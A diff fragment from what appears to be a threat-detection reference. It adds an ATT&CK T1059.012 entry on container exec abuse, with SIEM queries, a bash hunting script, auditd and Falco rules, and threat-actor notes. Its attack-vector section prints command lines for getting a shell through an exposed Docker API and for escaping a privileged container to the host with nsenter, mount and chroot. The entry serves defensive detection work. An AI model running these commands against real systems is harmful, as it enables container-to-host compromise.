+          { cls: "apt-mul", name: "Legacy web exploiters", note: "Perl reverse shells standard in CGI-era exploitation chains; still encountered on RHEL6/CentOS6 and legacy Apache systems." }
+        ],
+        cite: "MITRE ATT&CK T1059"
+      }
+    ]
+  },
+  {
+    id: "T1059.012",
+    name: "Command and Scripting Interpreter: Container Administration Command",
+    desc: "docker exec / kubectl exec / nsenter / crictl exec to spawn interactive shells inside running containers — lateral movement between containers and container-to-host pivot via privileged container exec chains",
+    rows: [
+      {
+        sub: "T1059.012 - Container Shell via docker exec / kubectl exec / nsenter",
+        os: "linux",
+        indicator: "docker exec, kubectl exec, or nsenter used to spawn an interactive shell inside a running container from the host — grants execution context inside the container, potentially bypassing container-level security controls or pivoting into a privileged container",
+        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
+
+// docker exec spawning shell inside container
+Image=*/docker AND CommandLine matches:
+  *exec* AND (*bash* OR */bin/sh* OR *-it* OR *-i*)
+  *exec -it* AND (*bash* OR *sh* OR *ash* OR *dash*)
+
+// kubectl exec into pod
+Image=(*kubectl OR */kubectl) AND CommandLine matches:
+  *exec* AND (*-- bash* OR *-- sh* OR *-- /bin/sh*)
+  *exec* -it* AND *-- *
+
+// nsenter (direct host namespace entry into container)
+Image=*/nsenter AND CommandLine matches:
+  *--target* OR *-t * (targeting a specific PID)
+  *--mount* OR *-m*   (entering mount namespace)
+  *--pid* OR *-p*     (entering PID namespace)
+  (any nsenter is suspicious if not from known admin tools)
+
+// crictl exec (containerd / CRI-O)
+Image=(*crictl) AND CommandLine matches:
+  *exec* AND (*-i* OR *-t* OR *bash* OR *sh*)
+
+// runc exec (OCI runtime direct execution)
+Image=*/runc AND CommandLine matches: *exec*`,
+        kibana: `// docker exec spawning interactive shell
+process.name: "docker"
+AND process.command_line: (*exec* AND (*bash* OR *sh* OR *-it* OR *-i* AND *-t*))
+
+// kubectl exec into pod shell
+process.name: "kubectl"
+AND process.command_line: (*exec* AND (*-- bash* OR *-- sh* OR *-- /bin/sh*))
+
+// nsenter (namespace entry from host into container)
+process.name: "nsenter"
+AND process.command_line: (*--target* OR *-t *)
+
+// crictl exec (containerd/CRI-O runtime)
+process.name: "crictl"
+AND process.command_line: (*exec* AND (*-i* OR *-t*))
+
+// Shell spawned inside container with suspicious parent
+// (visible from host-side Sysmon/auditd if using host PID namespace)
+process.parent.name: ("containerd-shim" OR "runc" OR "crun")
+AND process.name: ("bash" OR "sh" OR "dash")
+
+// Kubernetes audit log: exec into pod
+// (separate k8s audit pipeline)
+kubernetes.audit.verb: "create"
+AND kubernetes.audit.objectRef.subresource: "exec"
+AND kubernetes.audit.requestObject.command: (*bash* OR *sh*)`,
+        powershell: `#!/bin/bash
+# T1059.012 - Container exec shell hunt
+
+echo "[*] === Running containers ==="
+docker ps --format 'table {{.ID}}\\t{{.Image}}\\t{{.Command}}\\t{{.Status}}' \\
+  2>/dev/null || echo "Docker not available or not root"
+
+echo ""
+echo "[*] === docker exec events in auditd (today) ==="
+ausearch -k exec -i --start today 2>/dev/null | \\
+  grep "docker exec" | tail -20
+
+echo ""
+echo "[*] === Shells running inside containers (host view) ==="
+# Processes in container namespaces visible from host
+for pid in $(pgrep -x bash) $(pgrep -x sh) $(pgrep -x dash); do
+  # Check if PID is in a container namespace
+  host_ns=$(readlink /proc/1/ns/mnt 2>/dev/null)
+  pid_ns=$(readlink /proc/$pid/ns/mnt 2>/dev/null)
+  if [ "$host_ns" != "$pid_ns" ] && [ -n "$pid_ns" ]; then
+    echo "[FLAG] Shell in non-host namespace: PID $pid"
+    echo "  CMD: $(tr '\\0' ' ' < /proc/$pid/cmdline)"
+    echo "  User: $(stat -c '%U' /proc/$pid 2>/dev/null)"
+  fi
+done
+
+echo ""
+echo "[*] === nsenter events ==="
+ausearch -k exec -i --start today 2>/dev/null | \\
+  grep nsenter | tail -20
+
+echo ""
+echo "[*] === kubectl exec history ==="
+grep -r "kubectl.*exec" /root/.bash_history /home/*/.bash_history \\
+  2>/dev/null | tail -20
+
+echo ""
+echo "[*] === Privileged containers (potential breakout) ==="
+docker inspect \\
+  $(docker ps -q 2>/dev/null) 2>/dev/null | \\
+  python3 -c "
+import sys, json
+data = json.load(sys.stdin)
+for c in data:
+  name = c.get('Name','?')
+  priv = c.get('HostConfig',{}).get('Privileged', False)
+  caps = c.get('HostConfig',{}).get('CapAdd', [])
+  mounts = [m for m in c.get('Mounts',[]) if m.get('Source','')=='/']
+  if priv or 'SYS_ADMIN' in (caps or []) or mounts:
+    print(f'[FLAG] {name}: Privileged={priv} CapAdd={caps} HostMounts={mounts}')
+" 2>/dev/null`,
+        registry: `Container exec artifacts:
+
+Docker host artifacts:
+  /var/lib/docker/             - container storage
+  /var/log/syslog              - dockerd daemon log
+  Docker event log:
+    docker events --filter type=exec  (live)
+    (no persistent exec log without audit plugin)
+
+Container runtime logs:
+  /var/log/containers/*.log    - Kubernetes container logs
+  /var/log/pods/               - Pod-level logs (k8s)
+  journalctl -u docker         - dockerd service log
+
+Kubernetes audit log (separate pipeline):
+  API server audit log records:
+    verb: create
+    resource: pods
+    subresource: exec
+  This is the primary kubectl exec audit trail.
+  Requires kube-apiserver --audit-log-path= config.
+
+nsenter targets:
+  nsenter --target <PID> --mount --pid
+  Any nsenter invocation targeting the init PID (1) of
+  a container is entering the container's namespaces
+
+Host-side process namespace check:
+  readlink /proc/<pid>/ns/mnt  - mount namespace ID
+  Processes not in host mount namespace = container
+
+Privileged container indicators (escape risk):
+  docker inspect --format '{{.HostConfig.Privileged}}'
+  Privileged containers can trivially escape to host.
+  Also check: --cap-add SYS_ADMIN, --pid=host, -v /:/host`,
+        tools: `Container exec abuse in intrusions:
+
+TeamTNT (mul) - cloud/container threat actor;
+  docker exec used to move laterally between containers
+  on compromised Docker daemon hosts; documented use of
+  exposed Docker API for container-to-host pivot
+
+Kinsing (mul) - cryptominer; exploits exposed Docker API
+  (port 2375) to run containers and exec into them;
+  also uses kubectl exec on misconfigured clusters
+
+Hildegard (mul) - cloud-targeted threat actor;
+  kubectl exec into running pods for lateral movement
+
+Siloscape (mul) - Windows container escaper but illustrates
+  the container exec → host pivot pattern
+
+Common attack vectors:
+  1. Exposed Docker daemon API (port 2375, no TLS):
+     docker -H tcp://target:2375 exec -it <id> /bin/sh
+  2. Compromised host → docker exec into app container
+  3. kubectl exec via compromised service account token
+  4. nsenter from host into container PID namespace
+     (requires CAP_SYS_ADMIN or root on host)
+
+Privileged container escape:
+  docker run --privileged → nsenter --target 1
+  --mount --pid --net gives full host access
+  mount /dev/<disk> /mnt && chroot /mnt  (host FS access)
+
+Detection gap:
+  docker exec does not generate an auditd execve event
+  for the command inside the container by default.
+  Host-side: only the docker exec call itself is visible.
+  Container-side: requires runtime security (Falco, sysdig)
+  or Kubernetes audit log for kubectl exec.`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_docker_exec_shell.yml
+- proc_creation_lnx_kubectl_exec.yml
+- proc_creation_lnx_nsenter_host_pivot.yml
+- proc_creation_lnx_crictl_exec.yml
+
+Falco (built-in rules for container security):
+  rule: Terminal Shell in Container
+    condition: spawned_process and container
+      and shell_procs and proc.tty != 0
+  rule: Attach to Running Container
+    (detects docker attach and exec)
+  Most relevant runtime security tool for this technique.
+
+Kubernetes audit log (k8s environments):
+  Configure kube-apiserver audit policy to log:
+    - resources: [pods/exec]
+      verbs: [create]
+  Feed to SIEM for kubectl exec alerting
+
+Elastic:
+- Container Shell Execution
+- Kubernetes Pod Exec
+
+Wazuh:
+  Docker integration module logs exec events
+  Configure active response on exec + shell pattern
+
+auditd (host-side):
+  -a always,exit -F arch=b64 -S execve \\
+    -F path=/usr/bin/docker -k docker_exec
+  -a always,exit -F arch=b64 -S execve \\
+    -F path=/usr/bin/nsenter -k nsenter_exec
+  ausearch -k docker_exec --start today | grep exec
+
+Velociraptor:
+  Linux.Detection.ContainerExec
+  Custom VQL for docker exec events`,
+        notes: "Container administration exec commands (docker exec, kubectl exec, nsenter) are legitimate DevOps tools that also serve as primary lateral movement and post-exploitation mechanisms in containerized environments. The detection challenge is distinguishing authorized administrator use from attacker use: both generate identical process artifacts. Context is the key discriminator - alert on docker exec spawning a shell (bash/sh/dash) outside of expected maintenance windows, from unexpected source IPs or users, or targeting containers that should not have interactive sessions (databases, queue workers, monitoring agents). nsenter is especially powerful for attackers on the host: it allows entering a container's namespaces directly using the container's PID, bypassing the container runtime entirely, and requires only root or CAP_SYS_ADMIN on the host. The most dangerous scenario for detection purposes is a privileged container: any host-side exec into a privileged container, combined with nsenter --target 1 inside it, achieves full host root access. Falco provides the best real-time detection for container-side shell spawn; the Kubernetes audit log is the authoritative source for kubectl exec events.",
+        apt: [
+          { cls: "apt-mul", name: "TeamTNT", note: "Cloud/container threat actor; documented use of docker exec for lateral movement between containers on compromised Docker hosts." },
+          { cls: "apt-mul", name: "Kinsing / Hildegard", note: "Cloud-targeted cryptominers; kubectl exec and docker exec used to run payloads in container environments." },
+          { cls: "apt-mul", name: "Container escape operators", note: "Privileged container exec chains (docker exec → nsenter --target 1) documented as container-to-host pivot across multiple campaigns." }
+        ],
+        cite: "MITRE ATT&CK T1059.012"
       }
     ]
   }
